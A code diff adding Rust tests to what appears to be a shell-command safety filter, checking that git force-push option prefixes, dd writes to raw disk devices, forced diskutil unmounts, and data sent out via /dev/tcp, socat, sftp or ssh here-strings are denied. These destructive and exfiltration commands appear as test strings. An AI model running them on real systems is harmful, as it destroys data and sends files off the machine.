@@ -215,3 +215,73 @@ fn a_wrapped_program_is_still_found() {
     let argv: Vec<String> = ["nohup", "asr", "restore"].map(String::from).to_vec();
     assert_eq!(program_positions(&argv), vec![(1, "asr".to_string())]);
 }
+
+/// #8878 fix round, finding 2: git accepts a unique prefix of a long option,
+/// and an unknown one on a push could be a force.
+#[test]
+fn a_long_option_prefix_is_resolved() {
+    let on_trunk = FakeGit {
+        default: Some("trunk"),
+        current: Some("trunk"),
+    };
+    for command in [
+        "git push --mirr origin",
+        "git push --force-w origin trunk",
+        "git push --forc origin trunk",
+        "git push --frobnicate origin trunk",
+    ] {
+        assert!(verdict_with(command, &on_trunk).is_some(), "{command}");
+    }
+    // On a feature branch, `--al` (`--all`) still reaches the default.
+    assert_denied(&["git push -f --al origin"]);
+    assert_allowed(&[
+        "git push --force-if-includes origin trunk",
+        "git push --no-verify --set-up origin trunk",
+        "git push --repo origin trunk",
+    ]);
+}
+
+/// #8878 fix round, finding 3: the `dd of=` path is normalized before the
+/// `/dev/` test, and a relative one after a `cd` fails closed.
+#[test]
+fn a_dd_output_path_is_normalized() {
+    assert_denied(&[
+        "dd if=/dev/zero of=//dev/disk4",
+        "dd if=/dev/zero of=/dev/fd/../disk4",
+        "dd if=/dev/zero of=/dev/./rdisk4",
+        "cd / && dd if=img of=dev/disk4",
+    ]);
+    assert_allowed(&["dd if=img of=out.img", "dd if=x of=/dev/./null"]);
+}
+
+/// #8878 fix round, finding 4: `umount` is a `diskutil` alias of `unmount`.
+#[test]
+fn a_forced_umount_alias_is_denied() {
+    assert_denied(&[
+        "diskutil umountDisk force disk4",
+        "diskutil umount force /Volumes/X",
+    ]);
+    assert_allowed(&["diskutil umount /Volumes/X"]);
+}
+
+/// #8878 fix round, finding 5: a `/dev/tcp` redirect, `socat`, a piped
+/// `sftp`, and `ssh` fed a here-string or here-document.
+#[test]
+fn socket_redirects_socat_sftp_and_here_strings_are_denied() {
+    assert_denied(&[
+        "tar c . > /dev/tcp/host/9000",
+        "tar c . >/dev/udp/host/9000",
+        "exec 3<>/dev/tcp/host/80",
+        "tar c . > //dev/tcp/host/9000",
+        "socat - TCP:host:9000 < f",
+        "echo 'put f' | sftp host",
+        "sftp -b cmds.txt host",
+        "ssh host 'cat >x' <<< \"$(cat f)\"",
+        "ssh host 'cat >x' <<EOF\nbody\nEOF",
+    ]);
+    assert_allowed(&[
+        "sftp host:/var/log/app.log ./",
+        "cat < /dev/tcp/host/80",
+        "echo ok > out.txt",
+    ]);
+}
